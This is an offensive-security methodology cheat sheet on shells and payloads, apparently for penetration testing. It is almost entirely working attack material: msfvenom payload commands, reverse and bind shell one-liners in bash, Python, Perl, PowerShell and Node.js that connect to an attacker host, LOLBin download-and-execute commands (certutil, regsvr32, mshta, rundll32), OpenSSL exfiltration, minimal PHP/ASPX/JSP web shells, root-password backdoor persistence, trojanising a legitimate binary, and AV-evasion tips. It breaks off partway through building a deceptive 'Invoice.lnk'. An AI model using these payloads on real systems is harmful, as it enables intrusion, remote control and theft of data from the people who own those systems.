# Shells and Payloads Methodology

Comprehensive reference for shell types, payload generation, listener catching, and TTY upgrades. Every tool-based technique is paired with a Living-Off-The-Land (LOTL) equivalent using built-in OS binaries wherever practical.

Cross-references:
- [windows-methodology.md](windows-methodology.md) — Windows-specific execution and AMSI bypass
- [linux-methodology.md](linux-methodology.md) — Linux foothold and privesc
- [av-evasion.md](av-evasion.md) — payload obfuscation, AV/EDR-aware payload variants, donut/sgn/sRDI loaders
- [file-transfers.md](file-transfers.md) — delivering payloads to target

## Table of Contents

- [Phase 0: Shell Types Overview](#phase-0-shell-types-overview)
- [Phase 1: msfvenom Complete Reference](#phase-1-msfvenom-complete-reference)
- [Phase 2: Reverse Shell Payloads (with LOTL Alternatives)](#phase-2-reverse-shell-payloads-with-lotl-alternatives)
- [Phase 3: TTY Upgrade](#phase-3-tty-upgrade)
- [Phase 4: Catching Shells with pwncat-cs](#phase-4-catching-shells-with-pwncat-cs)
- [Phase 5: Web Shells](#phase-5-web-shells)
- [Phase 6: Bind Shells](#phase-6-bind-shells)
- [Phase 7: Detection Evasion Basics](#phase-7-detection-evasion-basics)
- [Phase 8: Payload Delivery Vectors](#phase-8-payload-delivery-vectors)
- [Quick Reference Cheatsheet](#quick-reference-cheatsheet)

---

## Phase 0: Shell Types Overview

### Bind vs Reverse

| Type | Direction | Use Case | Firewall Considerations |
|------|-----------|----------|-------------------------|
| **Bind** | Attacker → Target (target listens) | Target has open inbound port, no outbound allowed | Target must accept inbound on chosen port |
| **Reverse** | Target → Attacker (attacker listens) | Target is behind NAT, outbound allowed | Most common; bypass egress on 80/443/53 |

### Staged vs Stageless

| Type | Suffix | Size | Behavior |
|------|--------|------|----------|
| **Staged** | `_tcp`, `_http`, `_https` | Small (~300 bytes stub) | Stub downloads payload (stage 2) from handler |
| **Stageless** | `_tcp_uuid`, `_reverse_tcp` (no `/`) | Larger (~200KB+) | Full payload self-contained |

In Metasploit naming: `windows/meterpreter/reverse_tcp` is **staged**, `windows/meterpreter_reverse_tcp` is **stageless** (note the underscore vs slash).

### Encrypted Channels

- `reverse_https` / `reverse_winhttps` — TLS-wrapped, blends with HTTPS traffic, uses WinINet on Windows for proxy awareness
- `reverse_tcp_rc4` — RC4-encrypted TCP
- `reverse_tcp_uuid` — UUID-tagged for multi-session disambiguation

### Interactive vs Non-Interactive

- **Non-interactive**: cannot run `sudo`, `ssh`, `vi`, `su` (no PTY). Tab-completion broken. Ctrl+C kills shell.
- **Interactive (PTY)**: full terminal control, job control, screen-redraw apps work.

See [Phase 3: TTY Upgrade](#phase-3-tty-upgrade) for promoting non-interactive to interactive.

[^ top](#shells-and-payloads-methodology)

---

## Phase 1: msfvenom Complete Reference

### Format Matrix

| Target | Format Flag | Notes |
|--------|-------------|-------|
| Windows EXE | `-f exe` | Standalone executable |
| Windows EXE-Service | `-f exe-service` | Survives `sc start`; service-aware |
| Windows DLL | `-f dll` | Use with rundll32, AppDomainManager, sideloading |
| ASP.NET | `-f aspx` | Drop in IIS webroot |
| Java EE | `-f war` | Tomcat/JBoss `/manager/deploy` |
| Java | `-f jar` | Jenkins, generic JVM |
| JSP | `-f jsp` | Tomcat / Java app servers |
| PHP | `-f raw` (with `php/meterpreter/reverse_tcp`) | Wrap in `<?php ?>` |
| Linux ELF | `-f elf` | Standalone executable |
| Linux SO | `-f elf-so` | LD_PRELOAD, shared lib hijack |
| macOS | `-f macho` | Mach-O binary |
| Raw shellcode | `-f raw` | Pipe into loader, donut, sgn |
| C array | `-f c` | Embed in custom loader |
| Python | `-f python` | Embed in script |
| PowerShell | `-f ps1` | Standalone .ps1 |
| HTA | `-f hta-psh` | mshta delivery |
| MSI | `-f msi` | msiexec install |
| VBS | `-f vbs` | wscript / cscript |
| VBA | `-f vba` | Office macro |
| Bash | `-f bash` | Embed in shell script |

### Payload Selection per OS/Arch

```bash
# Windows x64 staged meterpreter (most common)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f exe -o shell.exe

# Windows x64 stageless (firewall/IDS friendly, single download)
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f exe -o shell.exe

# Windows x64 HTTPS (blends with web traffic)
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ATTACKER_IP> LPORT=443 -f exe -o shell.exe

# Windows x86 (legacy / WoW64)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f exe -o shell32.exe

# Linux x64
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f elf -o shell.elf

# Linux x86
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f elf -o shell32.elf

# Java (cross-platform)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f raw -o shell.jsp
msfvenom -p java/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f jar -o shell.jar

# PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f raw -o shell.php
# Then prepend <?php  manually or use:
echo '<?php ' | cat - shell.php > shell.php.tmp && mv shell.php.tmp shell.php

# Python
msfvenom -p python/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f raw -o shell.py

# Generic cmd shell (no meterpreter)
msfvenom -p cmd/unix/reverse_bash LHOST=<ATTACKER_IP> LPORT=4444 -f raw
msfvenom -p cmd/windows/reverse_powershell LHOST=<ATTACKER_IP> LPORT=4444 -f raw
```

### Encoders

```bash
# x86 shikata_ga_nai polymorphic, 10 iterations
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o enc.exe

# x64 dynamic XOR
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -e x64/xor_dynamic -i 5 -f exe -o enc.exe

# List all encoders
msfvenom --list encoders

# Chained: encode raw then re-encode
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -e x86/shikata_ga_nai -i 5 -f raw | \
  msfvenom -e x86/countdown -i 3 -f exe -o chained.exe
```

> **Note:** Modern AV signatures all common encoder stubs. Encoders are useful for bad-char filtering in exploits, not for AV bypass. See [av-evasion.md](av-evasion.md).

### Bad Characters

```bash
# Exclude null, line feed, carriage return (typical for buffer overflow)
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -b '\x00\x0a\x0d' -f c

# Common bad-char sets:
# Web/URL contexts: -b '\x00\x0a\x0d\x20\x25\x26\x2b\x3d'
# String functions:  -b '\x00\x0a\x0d\x20'
# Stack BOF:         -b '\x00'
```

### NOP Sled

```bash
# Prepend 16-byte NOP sled (raw shellcode for exploit dev)
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 --nopsled 16 -f c
```

### Template / Binary Injection

```bash
# Inject payload into legitimate signed binary, keep original functionality
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ATTACKER_IP> LPORT=443 \
  -x /usr/share/windows-resources/binaries/putty.exe -k \
  -f exe -o putty_backdoored.exe

# -x : template binary
# -k : keep template's original functionality (spawns payload in new thread)
```

### Payload Encryption (msfvenom 6+)

```bash
# AES-256 encrypted payload
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ATTACKER_IP> LPORT=443 \
  --encrypt aes256 --encrypt-key <ENCRYPT_KEY> \
  -f exe -o encrypted.exe

# Available: --encrypt {xor,rc4,base64,aes256}
```

### Useful Generation Flags

| Flag | Purpose |
|------|---------|
| `-p` | Payload (use `--list payloads` to enumerate) |
| `-f` | Output format |
| `-o` | Output file |
| `-a` | Architecture (`x86`, `x64`) |
| `--platform` | Override platform (`windows`, `linux`) |
| `-e` | Encoder |
| `-i` | Encoder iterations |
| `-b` | Bad characters |
| `-x` | Template binary |
| `-k` | Keep template functional |
| `--smallest` | Generate smallest possible payload |
| `-v` | Variable name (for `-f c` / `-f python`) |
| `--encrypt` | Encrypt final payload |

### Listener Catching

```bash
# Metasploit multi/handler — most flexible
msfconsole -q -x "use exploit/multi/handler; \
  set PAYLOAD windows/x64/meterpreter/reverse_https; \
  set LHOST 0.0.0.0; set LPORT 443; \
  set ExitOnSession false; \
  exploit -j -z"

# Plain netcat (cmd shells only, no meterpreter)
nc -lvnp 4444

# Readline-wrapped netcat (history + arrow keys)
rlwrap nc -lvnp 4444

# Ncat with TLS
ncat --ssl -lvnp 443

# Socat with PTY
socat -d -d TCP-LISTEN:4444,reuseaddr,fork FILE:`tty`,raw,echo=0

# pwncat-cs (modern replacement for nc — see Phase 4)
pwncat-cs -lp 4444
```

[^ top](#shells-and-payloads-methodology)

---

## Phase 2: Reverse Shell Payloads (with LOTL Alternatives)

Reference: <https://www.revshells.com> for one-stop generator.

### Bash (Linux LOTL — no tools needed)

```bash
# /dev/tcp pseudo-device (built into bash)
bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'

# Alternative form
exec 5<>/dev/tcp/<ATTACKER_IP>/4444; cat <&5 | while read line; do $line 2>&5 >&5; done

# UDP variant
bash -c 'bash -i >& /dev/udp/<ATTACKER_IP>/4444 0>&1'
```

### sh / busybox

```bash
# Embedded systems / minimal containers
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f

# busybox nc (no -e support typically)
busybox nc <ATTACKER_IP> 4444 -e /bin/sh
```

### Python

```bash
# python3
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<ATTACKER_IP>",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'

# python2 (legacy)
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### Perl

```bash
perl -e 'use Socket;$i="<ATTACKER_IP>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Ruby

```bash
ruby -rsocket -e 'spawn("sh",[:in,:out,:err]=>TCPSocket.new("<ATTACKER_IP>",4444))'
```

### Node.js

```bash
# Native net + child_process (always works in Node containers)
node -e "var net=require('net'),cp=require('child_process'),sh=cp.spawn('sh',[]);var c=new net.Socket();c.connect(4444,'<ATTACKER_IP>',function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c)});"

# mkfifo + nc (LOTL — when nc is available in the container)
node -e "require('child_process').exec('mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f')"
# If /tmp/f exists from prior attempt: rm -f /tmp/f first

# require() one-liner (alternative — uses bash /dev/tcp)
node -e "require('child_process').exec('bash -c \"bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1\"')"

# IMPORTANT: exec() vs execSync()
# exec()     = non-blocking → shell persists → USE THIS FOR REVERSE SHELLS
# execSync() = blocking → shell dies on timeout → use only for command output exfiltration
```

> **Container-aware shell selection:**
> Before sending a reverse shell, check what's available on target:
> `which bash sh nc curl wget node python3 2>/dev/null`
> - **Alpine containers**: no `bash` → use `sh` or `node` native shell
> - **Node.js containers**: `node` is always available → use native net module shell
> - **Distroless**: extremely limited → may need static binary upload

### PHP

```bash
php -r '$sock=fsockopen("<ATTACKER_IP>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### PowerShell (Windows LOTL)

```powershell
# Classic IEX one-liner (download cradle)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/Invoke-PowerShellTcp.ps1')"

# Native TCPClient reverse shell (no download required)
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER_IP>',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Base64-encoded (avoids quoting issues)
$cmd = "<powershell payload>"
$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
powershell -nop -w hidden -enc $enc
```

### Windows LOTL Downloaders

```powershell
# certutil (signed Microsoft binary)
certutil -urlcache -split -f http://<ATTACKER_IP>/payload.exe C:\Windows\Temp\p.exe & C:\Windows\Temp\p.exe

# bitsadmin
bitsadmin /transfer myDownload /priority normal http://<ATTACKER_IP>/p.exe C:\Windows\Temp\p.exe

# PowerShell DownloadFile
powershell -c "(New-Object Net.WebClient).DownloadFile('http://<ATTACKER_IP>/p.exe','C:\Windows\Temp\p.exe')"

# PowerShell Invoke-WebRequest
powershell -c "iwr http://<ATTACKER_IP>/p.exe -OutFile C:\Windows\Temp\p.exe"

# curl (Windows 10 1803+)
curl http://<ATTACKER_IP>/p.exe -o C:\Windows\Temp\p.exe
```

### Squiblydoo / Living-Off-The-Land Execution

```cmd
:: regsvr32 + scrobj.dll (squiblydoo) — runs remote SCT
regsvr32 /s /n /u /i:http://<ATTACKER_IP>/file.sct scrobj.dll

:: mshta — HTML Application execution
mshta http://<ATTACKER_IP>/payload.hta
mshta vbscript:CreateObject("Wscript.Shell").Run("powershell -nop -w hidden -c IEX((New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/p.ps1'))")(window.close)

:: rundll32 with JS
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -c IEX(IWR http://<ATTACKER_IP>/p.ps1 -UseBasicParsing)")

:: cmstp (INF-based execution)
cmstp.exe /s payload.inf
```

### IPv6 Reverse Shell (AF_INET6)

When the target only has IPv6 reachability (link-local, dual-stack-but-v4-firewalled, v6-only segment) the v4 payloads above will not work. `bash /dev/tcp` has **no IPv6 support** — use Python `AF_INET6`, `ncat`, or `socat`.

```bash
# Attacker — IPv6 listener (ncat handles v6 natively)
ncat -lvn <ATTACKER_IPV6> <ATTACKER_PORT>

# Listen on all v6 + v4 (dual-stack box)
ncat -lvn -6 <ATTACKER_PORT>

# socat alternative — interactive PTY listener over v6
socat -d -d TCP6-LISTEN:<ATTACKER_PORT>,reuseaddr,fork file:`tty`,raw,echo=0

# Open local firewall for inbound v6 (Linux ufw)
sudo ufw allow from <TARGET_IP> to any port <ATTACKER_PORT>
# nftables alternative
sudo nft add rule inet filter input ip6 saddr <TARGET_IP> tcp dport <ATTACKER_PORT> accept
```

```python
# Target — Python3 IPv6 reverse shell. Note AF_INET6 + 4-tuple connect (host, port, flowinfo, scopeid).
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",<ATTACKER_PORT>,0,0));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Python2 variant (legacy targets)
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",<ATTACKER_PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

```bash
# bash /dev/tcp does NOT support IPv6 — use python / ncat / socat instead

# ncat outbound (target side) — works over v6
ncat -e /bin/sh <ATTACKER_IP> <ATTACKER_PORT>

# mkfifo + ncat (no -e support)
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | ncat <ATTACKER_IP> <ATTACKER_PORT> > /tmp/f

# socat outbound (target) — wrap v6 literal in [] for socat URL syntax
socat TCP6:[<ATTACKER_IP>]:<ATTACKER_PORT> EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

> **Tip:** Link-local-only target needs the scope-id in the v6 connect tuple: `("fe80::1",<ATTACKER_PORT>,0,<IFINDEX>)`. Get `<IFINDEX>` on the target with `ip -6 link` (the number left of the iface name) or `python3 -c 'import socket;print(socket.if_nametoindex("eth0"))'`.

> **URL-encoding gotcha:** delivering this via web command-injection — colons in v6 addresses break shells/HTTP parsers. Encode before pasting into a vulnerable parameter: `:` → `%3a`, `;` → `%3b`, space → `+`, `"` → `%22`. Burp Repeater Ctrl+U URL-encodes selection.

### OpenSSL.exe — Windows LOTL (egress scan, dual-pipe TLS shell, file transfer)

OpenSSL is NOT a default Windows binary — only a LOTL where installed (Apache/IIS, FileZilla, Git for Windows, dev VMs, OpenVPN, common third-party apps). When present, it provides a TLS-wrapped reverse shell that bypasses plaintext IDS and an egress-port scanner that works without PowerShell.

#### Locate openssl.exe on the victim

```cmd
REM Walk the filesystem (slow but thorough)
dir /s /b C:\openssl.exe 2>nul

REM Check %PATH% and common install paths
where openssl
dir "C:\Program Files\OpenSSL-Win64\bin\openssl.exe" 2>nul
dir "C:\Program Files (x86)\OpenSSL-Win32\bin\openssl.exe" 2>nul
dir "C:\Program Files\Git\usr\bin\openssl.exe" 2>nul
dir "C:\Program Files\FileZilla Server\openssl.exe" 2>nul
dir "C:\xampp\apache\bin\openssl.exe" 2>nul
```

#### Attacker — generate self-signed cert and start two TLS listeners

```bash
# Self-signed cert for the s_server side
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=lab"

# Two listeners — one per direction (stdin/stdout split for the dual-pipe shell)
openssl s_server -quiet -key key.pem -cert cert.pem -port <ATTACKER_PORT>     # receives victim stdout
openssl s_server -quiet -key key.pem -cert cert.pem -port <ATTACKER_PORT2>    # sends operator stdin
```

#### Egress port scan from a constrained Windows shell

When PowerShell is locked down (CLM) or blocked, openssl s_client probes outbound TCP. Watch for SYNs landing on the attacker side with tshark to identify which port the egress firewall allows.

```bash
# Attacker — watch for connection attempts
sudo tshark -i tun0 host <TARGET_IP> and portrange 1-1000
```

```cmd
REM Victim — sweep outbound ports until one connects (cmd.exe loop)
FOR /l %i in (1,1,1000) DO C:\Progra~1\OpenSSL-Win64\bin\openssl.exe s_client -connect <ATTACKER_IP>:%i
```

#### Dual-pipe TLS reverse shell (telnet-trick over TLS)

Pipes cmd.exe stdout through one TLS session and reads operator stdin from a second — works because openssl s_client is bidirectional but cmd.exe needs separate stdin/stdout streams to behave interactively.

```cmd
START "" cmd /c "C:\Progra~1\OpenSSL-Win64\bin\openssl.exe s_client -quiet -connect <ATTACKER_IP>:<ATTACKER_PORT> | cmd.exe | C:\Progra~1\OpenSSL-Win64\bin\openssl.exe s_client -quiet -connect <ATTACKER_IP>:<ATTACKER_PORT2>"
```

#### File transfer over TLS pipe

```bash
# Attacker — host a file for download to victim
openssl s_server -quiet -accept <ATTACKER_PORT> -cert cert.pem -key key.pem < payload.bin

# Attacker — receive an upload (exfil) from victim
openssl s_server -quiet -accept <ATTACKER_PORT> -cert cert.pem -key key.pem > loot.bin
```

```cmd
REM Victim — download
C:\Progra~1\OpenSSL-Win64\bin\openssl.exe s_client -connect <ATTACKER_IP>:<ATTACKER_PORT> -quiet > C:\Users\Public\payload.bin

REM Victim — upload (exfil)
C:\Progra~1\OpenSSL-Win64\bin\openssl.exe s_client -connect <ATTACKER_IP>:<ATTACKER_PORT> -quiet < C:\loot\target.bin

REM Integrity check post-transfer
C:\Progra~1\OpenSSL-Win64\bin\openssl.exe sha256 C:\Users\Public\payload.bin
```

#### base64 encode/decode for text-channel exfil (DNS TXT, web form, paste)

```cmd
C:\Progra~1\OpenSSL-Win64\bin\openssl.exe base64 -in secret.pvk -out secret.pvk.b64
```

```bash
# Attacker side — decode
openssl base64 -d -in secret.pvk.b64 -out secret.pvk
```

> **LOTL caveat:** OpenSSL is third-party on Windows — confirm presence first. Common bundled paths: `C:\Program Files\OpenSSL-Win64\bin\openssl.exe`, `C:\Program Files\Git\usr\bin\openssl.exe`, `C:\xampp\apache\bin\openssl.exe`.

> **OPSEC:** TLS hides the payload from plaintext IDS but the JA3 fingerprint of `openssl s_client` is well-known (commonly flagged by mature SOCs). TLS on uncommon outbound ports (73, 136, etc.) is itself an IOC — egress port choice trades firewall bypass for detection signal.

[^ top](#shells-and-payloads-methodology)

---

## Phase 3: TTY Upgrade

### Linux Reverse Shell → Full PTY

```bash
# Step 1 — spawn pty
python3 -c 'import pty; pty.spawn("/bin/bash")'
# fallback if no python3:
python -c 'import pty; pty.spawn("/bin/bash")'
script -q /dev/null /bin/bash
/usr/bin/script -qc /bin/bash /dev/null

# Step 2 — background and configure raw mode
# Press Ctrl+Z to background
stty raw -echo; fg
# Press Enter twice

# Step 3 — set terminal type and size
export TERM=xterm-256color
export SHELL=bash
stty rows 50 columns 200
# (Get values from local terminal: stty size)
```

### One-shot Upgrade Cheatsheet

```bash
# All-in-one (after catching shell)
python3 -c 'import pty;pty.spawn("/bin/bash")'
^Z
stty raw -echo; fg
reset
export TERM=xterm-256color
stty rows $(tput lines) columns $(tput cols)
```

### Socat Interactive Listener (skip TTY upgrade altogether)

```bash
# Attacker — pty listener
socat file:`tty`,raw,echo=0 TCP-LISTEN:4444

# Victim Linux
socat exec:'bash -li',pty,stderr,setsid,sigint,sane TCP:<ATTACKER_IP>:4444

# Static socat for victims without socat — stage from Kali
# Source: https://github.com/andrew-d/static-binaries (linux/x86_64/socat)
# Attacker (Kali): obtain static socat binary locally, then: python3 -m http.server 80
wget -q http://<ATTACKER_IP>/socat -O /tmp/socat
chmod +x /tmp/socat
/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane TCP:<ATTACKER_IP>:4444
```

### Windows Full PTY — ConPtyShell

```powershell
# Attacker
stty raw -echo; (stty size; cat) | nc -lvnp 4444

# Victim (ConPtyShell) — fetch from attacker-hosted SimpleHTTPServer (do NOT pull directly from GitHub raw)
# Attacker (Kali): obtain Invoke-ConPtyShell.ps1 locally, then: python3 -m http.server 80
# Victim:   IEX(IWR http://<ATTACKER_IP>/Invoke-ConPtyShell.ps1 -UseBasicParsing)
Invoke-ConPtyShell <ATTACKER_IP> 4444 -Rows 50 -Cols 200
```

[^ top](#shells-and-payloads-methodology)

---

## Phase 4: Catching Shells with pwncat-cs

`pwncat-cs` is the modern Python rewrite of pwncat (Caleb Stewart fork). Provides automatic TTY upgrade, persistence, privesc enumeration, and tab completion in caught shells.

```bash
# Install (if not present)
pipx install pwncat-cs

# Listen
pwncat-cs -lp 4444

# Connect to bind shell
pwncat-cs <TARGET_IP>:4444

# SSH-style connection
pwncat-cs ssh://user:pass@<TARGET_IP>
```

### pwncat-cs Workflow

```text
# After shell catches, drop to pwncat prompt with Ctrl+D
(local) pwncat$ help                    # list commands
(local) pwncat$ sessions                # list active sessions
(local) pwncat$ session 1               # switch session
(local) pwncat$ download /etc/shadow    # pull file
(local) pwncat$ upload /tmp/linpeas.sh  # push file
(local) pwncat$ run enumerate           # run all enum modules
(local) pwncat$ run enumerate.gather    # detailed gather
(local) pwncat$ run privesc.list        # list privesc paths
(local) pwncat$ run privesc.escalate    # auto-escalate
(local) pwncat$ run persist.add         # add persistence
(local) pwncat$ back                    # back to remote shell
```

### pwncat-cs Persistence Modules

```text
(local) pwncat$ run persist.gather                    # list installed
(local) pwncat$ run persist.add persist.authorized_keys
(local) pwncat$ run persist.add persist.passwd_backdoor user=root password=<PASSWORD>
(local) pwncat$ run persist.add persist.system_systemd
(local) pwncat$ run persist.remove ...                # cleanup
```

[^ top](#shells-and-payloads-methodology)

---

## Phase 5: Web Shells

### PHP — minimal

```php
<?php system($_GET['c']); ?>
```

```php
<?php
// More featureful
if(isset($_REQUEST['c'])){echo "<pre>";passthru($_REQUEST['c']);echo "</pre>";}
?>
```

```bash
# Trigger
curl "http://<TARGET_IP>/shell.php?c=id"
curl "http://<TARGET_IP>/shell.php?c=$(echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' | base64 -w0)" \
  --data-urlencode "c=echo <BASE64> | base64 -d | bash"
```

### ASPX — minimal

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<% Process.Start("cmd.exe","/c " + Request["c"]); %>
```

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%
string cmd = Request["c"];
ProcessStartInfo psi = new ProcessStartInfo("cmd.exe","/c "+cmd);
psi.RedirectStandardOutput = true; psi.UseShellExecute = false;
Process p = Process.Start(psi);
Response.Write("<pre>"+p.StandardOutput.ReadToEnd()+"</pre>");
%>
```

### JSP — minimal

```jsp
<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("c");
if(cmd != null){
  Process p = Runtime.getRuntime().exec(cmd);
  BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
  String line; while((line = br.readLine()) != null){ out.println(line); }
}
%>
```

### Generated Web Shells (msfvenom)

```bash
# PHP meterpreter
msfvenom -p php/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f raw -o shell.php
(echo '<?php '; cat shell.php) > shell_complete.php

# ASPX meterpreter
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f aspx -o shell.aspx

# WAR (Tomcat manager upload)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f war -o shell.war
jar tf shell.war   # confirm contents
# After deploy: curl http://<TARGET_IP>:8080/shell/

# JSP shell (drop in webroot)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f raw -o shell.jsp
```

### Specialized Web Shells

```bash
# weevely — encrypted PHP webshell
weevely generate <PASSWORD> /tmp/weevely.php
weevely http://<TARGET_IP>/weevely.php <PASSWORD>

# Inside weevely:
:audit_suidsgid
:file_download /etc/passwd ./passwd
:shell_php "system('id');"
```

| Tool | Type | Notes |
|------|------|-------|
| **weevely** | PHP | Encrypted, terminal-like, audit modules |
| **antSword** | Multi (PHP/ASP/JSP) | GUI, plugin ecosystem, AES encrypted |
| **Behinder** | Multi (encrypted dynamic) | Chinese, in-memory, very evasive |
| **Godzilla** | Multi (encrypted dynamic) | Successor to Behinder, AES+base64 |
| **chopper / china chopper** | ASP/PHP | Tiny one-liner, GUI client |

[^ top](#shells-and-payloads-methodology)

---

## Phase 6: Bind Shells

### Tool-based

```bash
# msfvenom bind shell
msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=4444 -f exe -o bind.exe
msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=4444 -f elf -o bind.elf

# Catching:
msfconsole -q -x "use exploit/multi/handler; \
  set PAYLOAD windows/x64/meterpreter/bind_tcp; \
  set RHOST <TARGET_IP>; set LPORT 4444; exploit"
```

### LOTL Bind Shells

```bash
# Linux — mkfifo + nc bind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -lvnp 4444 >/tmp/f

# Linux — ncat with -e
ncat -lvnp 4444 -e /bin/bash

# Linux — socat bind with PTY
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane

# Windows — ncat (if available)
ncat -lvnp 4444 -e cmd.exe

# Windows PowerShell bind shell (LOTL)
powershell -c "$listener = [System.Net.Sockets.TcpListener]4444; $listener.Start(); $client = $listener.AcceptTcpClient(); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (iex $data 2>&1 | Out-String); $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}"

# Connect from attacker:
nc <TARGET_IP> 4444
```

[^ top](#shells-and-payloads-methodology)

---

## Phase 7: Detection Evasion Basics

> Detailed AV/EDR bypass lives in [av-evasion.md](av-evasion.md). Quick checklist below.

- Prefer **stageless** payloads to avoid stub-fetch IDS signatures
- Use `reverse_https` over `reverse_tcp` — TLS encrypts traffic and ports 443/8443 are typically allowed outbound
- Use **template injection** (`-x putty.exe -k`) over plain `-f exe`
- Replace msfvenom encoders (signatured) with **donut** or **sgn**
- Strip PE compilation artifacts: `strip`, custom resources, valid certificates (signing)
- Use **AMSI bypass** before any PowerShell payload (cross-link [windows-methodology.md](windows-methodology.md))
- Avoid dropping to disk — prefer in-memory execution (`IEX`, `Add-Type`, .NET reflection)
- Match parent process: spawn from `explorer.exe` / `svchost.exe` rather than `cmd.exe → powershell.exe`

[^ top](#shells-and-payloads-methodology)

---

## Phase 8: Payload Delivery Vectors

High-level reference — keep deliveries authorized and in-scope.

### HTA (HTML Application)

```bash
# Generate
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ATTACKER_IP> LPORT=443 -f hta-psh -o payload.hta

# Host & deliver
python3 -m http.server 80
# Victim:
mshta http://<ATTACKER_IP>/payload.hta
```

### LNK Files

```powershell
# Create LNK that invokes powershell payload
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$pwd\Invoice.lnk")
